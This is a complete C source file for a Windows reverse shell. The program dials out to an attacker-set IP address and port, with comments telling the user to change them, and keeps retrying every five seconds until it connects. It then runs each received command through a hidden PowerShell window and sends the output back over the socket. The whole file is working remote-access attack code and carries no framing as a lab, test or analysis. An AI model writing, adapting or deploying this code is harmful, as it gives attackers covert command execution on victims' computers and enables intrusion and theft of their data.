#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

int main()
{
    printf("Program started...\n");

    WSADATA wsadata;
    int wsastart = WSAStartup(MAKEWORD(2,2), &wsadata);
    if (wsastart != 0)
        printf("WSAStartup failed\n");
    else
        printf("WSAStartup Success...\n");

    SOCKET outgoingsock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in routeinfo;
    memset(&routeinfo, 0, sizeof(routeinfo));
    routeinfo.sin_family = AF_INET;
    routeinfo.sin_addr.s_addr = inet_addr("127.0.0.1"); // CHANGE IP ADDRESS HERE!!
    routeinfo.sin_port = htons(8888);                   // CHANGE PORT HERE!!

    int connectionstatus = -1;

    printf("Loop Started...\n");
    while (connectionstatus)
    {
        printf("Connecting to %s:%d\n", inet_ntoa(routeinfo.sin_addr), ntohs(routeinfo.sin_port));
        int connecattempt = connect(outgoingsock, (struct sockaddr*)&routeinfo, sizeof(routeinfo));
        if (connecattempt == 0)
        {
            printf("Connection Successful...\n");
            connectionstatus = 0;
        }
        else
        {
            printf("Connection failed, error %d, trying again in 5 seconds..\n", WSAGetLastError());
            closesocket(outgoingsock);
            Sleep(5000);
            outgoingsock = socket(AF_INET, SOCK_STREAM, 0);
        }
    }

    char incominginstructions[2000];

    while (1)
    {
        int recsock = recv(outgoingsock, incominginstructions, sizeof(incominginstructions) - 1, 0);
        if (recsock <= 0)
        {
            printf("Couldn't receive commands\n");
            break;
        }

        // Null terminate at actual received length (not hardcoded index)
        incominginstructions[recsock] = '\0';

        // Strip trailing \r\n
        int len = strlen(incominginstructions);
        while (len > 0 && (incominginstructions[len-1] == '\n' || incominginstructions[len-1] == '\r'))
            incominginstructions[--len] = '\0';

        if (_stricmp(incominginstructions, "exit") == 0)
            break;

        // Build the powershell command string
        char pscommand[2300];
        snprintf(pscommand, sizeof(pscommand),
            "powershell.exe -NoProfile -NonInteractive -Command \"%s\"",
            incominginstructions);

        // Set up pipe for reading child process stdout/stderr
        HANDLE hReadPipe, hWritePipe;
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.bInheritHandle = TRUE;
        sa.lpSecurityDescriptor = NULL;

        if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
        {
            printf("CreatePipe failed, error %d\n", GetLastError());
            continue;
        }

        // Read end should not be inherited by child
        SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

        // Configure child process to use pipe as stdout and stderr
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));
        si.cb         = sizeof(si);
        si.dwFlags    = STARTF_USESTDHANDLES;
        si.hStdOutput = hWritePipe;
        si.hStdError  = hWritePipe;
        si.hStdInput  = NULL;

        if (!CreateProcess(NULL, pscommand, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        {
            printf("CreateProcess failed, error %d\n", GetLastError());
            CloseHandle(hReadPipe);
            CloseHandle(hWritePipe);
            continue;
        }

        // Close the write end in the parent or ReadFile will never return
        CloseHandle(hWritePipe);

        // Read all output from the pipe
        char outgoingoutp[8000];
        int total = 0;
        DWORD bytesRead;

        while (total < (int)sizeof(outgoingoutp) - 1)
        {
            if (!ReadFile(hReadPipe, outgoingoutp + total,
                sizeof(outgoingoutp) - 1 - total, &bytesRead, NULL) || bytesRead == 0)
                break;
            total += bytesRead;
        }
        outgoingoutp[total] = '\0';

        CloseHandle(hReadPipe);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        if (total == 0)
        {
            strcpy(outgoingoutp, "(no output)\n");
            total = strlen(outgoingoutp);
        }

        // Send all output back over the socket
        int total_sent = 0;
        while (total_sent < total)
        {
            int sent = send(outgoingsock, outgoingoutp + total_sent, total - total_sent, 0);
            if (sent <= 0) break;
            total_sent += sent;
        }
    }

    closesocket(outgoingsock);
    WSACleanup();
    return 0;
}